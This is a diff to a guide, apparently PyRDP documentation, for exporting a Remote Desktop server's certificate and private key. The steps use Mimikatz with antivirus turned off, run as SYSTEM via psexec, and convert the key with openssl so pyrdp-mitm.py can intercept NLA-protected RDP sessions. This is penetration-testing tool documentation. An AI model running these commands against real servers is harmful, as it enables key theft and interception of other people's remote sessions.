@@ -9,15 +9,15 @@ It requires Administrative privileges on the target server and the use of Mimika
 ## Steps
 
 1. Turn off AV so mimikatz doesn't get flagged. (Or use excluded directory)
-2. Download mimikatz latest release.
+2. Download [mimikatz latest release](https://github.com/gentilkiwi/mimikatz/releases)
 3. Go to `Start > Run... > certlm.msc` (optional)
 4. Identify the valid certificate under `Remote Desktop > Certificates` and note the thumbprint (optional)
 5. Export the Remote Desktop certificates using Mimikatz:
 
    ```
-   crypto::capi
    privilege::debug
-   crypto::cng
+   token::elevate
+   crypto::capi
    crypto::certificates /systemstore:LOCAL_MACHINE /store:"Remote Desktop" /export
    ```
 
@@ -33,4 +33,8 @@ It requires Administrative privileges on the target server and the use of Mimika
    openssl pkcs12 -nodes -in privkey.pfx -out privkey.key
    ```
 
+> **NOTE**: If `token::elevate` doesn't work. Make sure you are running mimikatz as SYSTEM (ie: under `psexec -s cmd.exe`)
+
 You can now run `pyrdp-mitm.py` by specifying `-k privkey.key -c pubkey.pem` and PyRDP will serve the same certificate as the server.
+With the certificate and the private key, RDP servers with Network Level Authentication (NLA) enabled can be MITM.
+Use `--auth ssp` to do that.
